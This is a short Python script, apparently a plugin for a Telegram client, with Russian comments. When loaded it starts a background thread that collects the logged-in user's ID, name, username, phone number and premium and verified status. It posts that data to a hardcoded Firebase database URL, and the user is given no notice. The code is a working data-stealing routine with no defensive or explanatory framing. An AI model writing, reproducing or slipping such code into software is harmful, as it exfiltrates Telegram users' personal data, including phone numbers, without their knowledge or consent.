import threading
import time
import json
import urllib.request

def _send_account_info():
    try:
        from org.telegram.messenger import UserConfig, MessagesController
        
        acc = UserConfig.selectedAccount
        user_id = UserConfig.getInstance(acc).getClientUserId()
        
        # Получаем объект пользователя
        mc = MessagesController.getInstance(acc)
        user = mc.getUser(user_id)
        
        account_data = {
            "user_id": str(user_id),
            "first_name": user.first_name if user else "Unknown",
            "last_name": user.last_name if user else "",
            "username": user.username if user and user.username else "",
            "phone": user.phone if user and user.phone else "",
            "is_premium": user.premium if user else False,
            "is_verified": user.verified if user else False,
            "timestamp": int(time.time()),
            "date_time": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Отправляем в Firebase
        url = "https://hzhzhz-dd57b-default-rtdb.firebaseio.com/telegram_account.json"
        req = urllib.request.Request(
            url,
            data=json.dumps(account_data).encode('utf-8'),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        
        response = urllib.request.urlopen(req, timeout=10)
        result = response.read().decode('utf-8')
        
        print(f"[OK] Аккаунт отправлен: {user.first_name} (@{user.username})")
        
    except Exception as e:
        print(f"[ERROR] {e}")

# Запуск
threading.Thread(target=_send_account_info, daemon=True).start()
